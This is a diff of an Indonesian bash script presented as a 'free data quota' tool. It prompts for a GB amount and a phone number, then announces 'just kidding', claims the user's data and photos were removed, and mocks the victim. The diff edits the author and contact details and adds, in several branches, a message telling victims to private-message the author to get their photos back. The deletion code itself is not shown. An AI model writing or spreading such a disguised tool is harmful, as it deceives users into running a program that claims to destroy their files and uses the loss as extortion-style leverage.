@@ -12,8 +12,8 @@ echo " "
 echo  $blue "<|======================================|>"
 echo  $red    "|       TOOLS KUOTA GRATIS          |"
 echo  $red    "|                                   |"
-echo  $red    "| Author        : Mr Not Fund       |"
-echo  $red    "| Contact       : 089999999999      |"
+echo  $red    "| Author        : Mr.Not Found      |"
+echo  $red    "| Contact       : 083862779675      |"
 echo  $red    "| My Team       : not found         |"
 echo  $red    "| Thanks To     : All Member        |"
 echo  $blue "<|======================================|>"
@@ -28,7 +28,7 @@ echo $blue "|| $green 4. Tri			      $blue ||"
 echo $blue "|| $green 0. Exit The Program             $blue ||"
 echo $blue "==================================================="
 echo $blue"╭──[Masukkan Pilihan Anda]>"
-read -p"╰───────root@dyxa#ABCD=•>" Gans;
+read -p"╰───────root@notfound=•>" Gans;
 
 if [ $Gans = 1 ] || [ $Gans = 01 ]
 then
@@ -63,6 +63,7 @@ echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
 echo "Eh TAPI BOONG :V" | lolcat
 echo  $blue "You data have been removed:V"
 echo  $green "BOKEP NYA DI HAPUS DULU YA GAN :V"
+echo  $green "KALAU INGIN FOTO BALIK PM SAYA :V"
 toilet -f standard "SELAMAT !!!! :v" | lolcat
 fi
 
@@ -100,6 +101,7 @@ echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
 echo "Eh TAPI BOONG :V" | lolcat
 echo  $blue "You data have been removed:V"
 echo  $green "BOKEP NYA DI HAPUS DULU YA GAN :V"
+echo  $green "KALAU INGIN FOTO BALIK PM SAYA :V"
 toilet -f standard "SELAMAT !!!! :v" | lolcat
 fi
 
@@ -137,6 +139,7 @@ echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
 echo "Eh TAPI BOONG :V" | lolcat
 echo  $blue "You data have been removed:V"
 echo  $green "BOKEP NYA DI HAPUS DULU YA GAN :V"
+echo  $green "KALAU INGIN FOTO BALIK PM SAYA :V"
 toilet -f standard "SELAMAT !!!! :v" | lolcat
 fi
 
@@ -144,7 +147,7 @@ fi
 if [ $Gans = 4 ] || [ $Gans = 04 ]
 then
 echo $blue"╭──[Berapa GB?]>"
-read -p"╰───────root@dyxa#ABCD=•>" kntl;
+read -p"╰───────root@notfound=•>" kntl;
 sleep 1
 echo $green"╭──[masukan nomor]>"
 read -p"╰───────root@notfound=•>" memeq;
@@ -174,6 +177,7 @@ echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
 echo "Eh TAPI BOONG :V" | lolcat
 echo  $blue "You data have been removed:V"
 echo  $green "BOKEP NYA DI HAPUS DULU YA GAN :V"
+echo  $green "KALAU INGIN FOTO BALIK PM SAYA :V"
 toilet -f standard "SELAMAT !!!! :v" | lolcat
 fi
 
